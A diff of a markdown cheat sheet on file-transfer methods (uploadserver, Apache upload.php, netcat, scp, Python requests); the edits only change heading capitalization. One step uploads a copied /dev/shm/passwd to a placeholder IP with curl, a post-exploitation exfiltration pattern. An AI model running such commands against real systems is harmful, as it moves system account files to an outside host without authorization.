@@ -1,4 +1,4 @@
-### **FILE UPLOADING USING PYTHON AND CURL**
+### **File Uploading Using Python and Curl**
 
 1.  Install uploadserver:  
     `sudo python3 -m pip install --user uploadserver`
@@ -11,7 +11,7 @@
 5.  Upload files using curl:  
     `curl -X POST https://hostname/upload -F 'files=@/path/to/file' --insecure`
 
-### **FILE UPLOADER ON APACHE WEB SERVER**
+### **File Uploader on Apache Web Server**
 
 1.  Create `upload.php` in `/var/www/html/`:
     
@@ -33,14 +33,14 @@
     `wget --post-file=/path/to/file http://[IP-ADRESS]/upload.php`
     
 
-### **FILE UPLOADER USING SIMPLEHTTPSERVERWITHUPLOAD**
+### **File Uploader Using SimpleHTTPServerWithUpload**
 
 1.  Start an HTTP server to accept file uploads using the script from [SimpleHTTPServerWithUpload](https://github.com/Tallguy297/SimpleHTTPServerWithUpload/blob/master/SimpleHTTPServerWithUpload.py):  
     `python3 SimpleHTTPServerWithUpload.py 80`
 2.  Upload passwd file using curl:  
     `curl -F 'file=@/dev/shm/passwd' http://[IP-ADRESS]/`
 
-### **FILE UPLOADING USING PYTHON REQUESTS MODULE**
+### **File Uploading Using Python Requests Module**
 
 1.  Install the uploadserver package:  
     `pip3 install uploadserver`
@@ -49,14 +49,14 @@
 3.  Upload a file:  
     `python3 -c 'import requests;requests.post("http://[IP-ADDRESS]:8000/upload",files={"files":open("/path/to/file","rb")})'`
 
-### **FILE UPLOADING USING NETCAT**
+### **File Uploading Using Netcat**
 
 1.  Start a netcat listener to receive file and save it as file.txt:  
     `nc -nvlp 9001 > file.txt`
 2.  Send the file.txt to the receiving machine:  
     `nc [IP-ADDRESS] 9001 < file.txt`
 
-### **FILE UPLOADING USING SCP**
+### **File Uploading Using SCP**
 
 1.  **TRANSFERRING FILES WITH A SPECIFIC SSH KEY:**  
     To use a specific SSH key for authentication, include the `-i` option. This is useful when dealing with multiple SSH keys or when the default key is not suitable for the connection.  
